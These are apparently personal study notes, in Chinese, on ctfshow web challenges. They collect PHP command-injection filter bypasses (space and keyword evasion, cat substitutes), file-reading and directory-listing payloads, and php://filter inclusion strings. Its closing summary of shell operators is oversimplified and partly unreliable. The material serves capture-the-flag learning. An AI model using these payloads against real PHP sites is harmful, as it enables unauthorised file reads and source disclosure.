---
title: web入门2-php
date: 2024-06-11
categories:
  - 学习笔记
tags:
  - 初学者
  - 日记
---

​    

##     php(绕过)

- ![](https://picgo-1372933092.cos.ap-guangzhou.myqcloud.com/ima/20250810171504710.webp)

- ![](D:\image (1).png)

- 使用url编码

1. ```
   %09（tab） %20（sapce）
   ```

2. ```
   绕过cat使用：
   tac more less head tac tail nl od(二进制查看) vi vim sort uniq rev
   ```

3. ```
   绕过空格用：
   %09 <> ${IFS} $IFS$ {cat,fl*} %20
   ```

4. ```
   对flag的过滤（这里也就几个，索性就全丢出来了）
   1.‘’    （例如fl‘’ag）
   2.“”     （例如fl""ag)
   3.?       (例如fl??)
   4.*          (例如fl*）
   ```

   

## 命令相关

```
c=show_source('flag.php');
c=highlight_file('flag.php');
c=print_r(scandir(dirname(__FILE__)));#扫描当前目录有什么文件
c=$a=opendir('./');while(($file = readdir($a)) !=false){echo $file." ";} #扫描当前目录有什么文件"
c=print_r(scandir(current(localeconv())));#扫描当前目录有什么文件
c=highlight_file(next(array_reverse(scandir((dirname(__FILE__))))));
```

**在这块，ctfshow的web61到65基本都能用**

但是在66就不同了。show_source 被禁用。
先使用 scandir() 进行[目录扫描](https://so.csdn.net/so/search?q=目录扫描&spm=1001.2101.3001.7020)c=print_r(scandir('.'))
![](https://picgo-1372933092.cos.ap-guangzhou.myqcloud.com/ima/20250810171957598.webp)

当前目录下只有 index.php 和 flag.php 	扫描根目录；c=print_r(scandir('/'));

![](https://picgo-1372933092.cos.ap-guangzhou.myqcloud.com/ima/20250810172032733.webp)

### **目录扫描的方法**

![](https://picgo-1372933092.cos.ap-guangzhou.myqcloud.com/ima/20250810172116982.webp)

![](https://picgo-1372933092.cos.ap-guangzhou.myqcloud.com/ima/20250810172135277.webp)

![](https://picgo-1372933092.cos.ap-guangzhou.myqcloud.com/ima/20250810172154372.webp)

其他常用的突破方式：

https://blog.csdn.net/qq_60518252/article/details/122686401?fromshare=blogdetail&sharetype=blogdetail&sharerId=122686401&sharerefer=PC&sharesource=2301_80915592&sharefrom=from_link

highlight_file 读取，如读取的被禁用了，那么可以用文件包含

c=include('/flag.txt');

print_r 也被禁用了，那就用var_dump	 var_export 函数打印变量c=var_export(scandir('/'));

### 当是get时，include文件包含

/?c=include"$_GET[a]"?>&a=php://filter/convert.base64-encode/resource=flag.php

### 当是post时，include文件包含

c=include($_POST['file']);&file=php://filter/convert.base64-encode/resource=flag.php

------

| //只执行后面那条命令

 || //只执行前面那条命令

 & //两条命令都会执行

 && //两条命令都会执行

